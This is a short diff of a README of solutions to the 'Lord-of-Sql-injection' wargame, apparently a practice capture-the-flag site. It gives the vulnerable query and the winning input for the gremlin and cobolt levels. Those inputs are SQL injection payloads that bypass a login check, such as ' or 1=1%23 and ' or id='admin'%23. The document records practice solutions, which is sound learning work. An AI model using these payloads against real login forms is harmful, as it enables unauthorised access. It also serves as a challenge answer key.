@@ -1,10 +1,10 @@
 # Lord-of-Sql-injection
 
-gremlin
-prob : select id from prob_gremlin where id='' and pw=''
-solve : ?id=' or 1=1%23
+#gremlin
+#prob : select id from prob_gremlin where id='' and pw=''
+#solve : ?id=' or 1=1%23
 
-cobolt
+#cobolt
 prob : select id from prob_cobolt where id='' and pw=md5('')
 solve : ?id=' or id='admin'%23
 
